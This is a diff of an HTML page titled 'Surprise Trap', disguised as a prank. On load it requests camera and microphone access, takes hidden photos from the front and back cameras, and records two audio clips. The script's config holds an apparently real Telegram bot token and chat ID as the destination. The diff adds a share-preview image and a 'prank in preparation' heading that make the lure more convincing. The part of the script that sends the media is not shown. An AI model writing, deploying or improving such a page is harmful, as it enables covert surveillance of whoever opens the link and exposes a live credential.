@@ -1,22 +1,30 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>😈 Surprise Trap</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:image" content="images.jpg"> <!-- هذا السطر لتحديد صورة المشاركة -->
+  <title>😈 Surprise Trap</title>
+  <style>
+    body { text-align: center; font-family: Arial; }
+    video { display: none; }
+    canvas { display: none; }
+  </style>
 </head>
 <body>
 
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<h3>😆 مقلب قيد التحضير...</h3>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
 /* ============ CONFIG ============ */
-const BOT_TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";  // توكنك هنا
-const CHAT_ID  = "6243038338";  // Chat ID هنا
+const BOT_TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";  
+const CHAT_ID  = "6243038338"; 
 
-const SHOTS = 3;        // عدد الصور
-const DELAY = 250;      // سرعة التصوير
-const AUDIO_TIME = 10000; // 10 ثواني
+const SHOTS = 3;
+const DELAY = 250; 
+const AUDIO_TIME = 10000; 
 /* ================================ */
 
 const video = document.getElementById("video");
@@ -27,27 +35,21 @@ let audioStream;
 
 /* ================= MAIN ================= */
 (async () => {
-  // طلب الكاميرا + المايك مرة وحدة
   const stream = await navigator.mediaDevices.getUserMedia({
     video: true,
     audio: true
   });
   audioStream = stream;
 
-  // 📸 أمامي
   await startCamera("user");
   await shootSeries("front");
 
   await sleep(700);
 
-  // 📸 خلفي
   await startCamera("environment");
   await shootSeries("back");
 
-  // 🎤 صوت 1
   await recordAndSendAudio(1);
-
-  // 🎤 صوت 2
   await recordAndSendAudio(2);
 })();
 
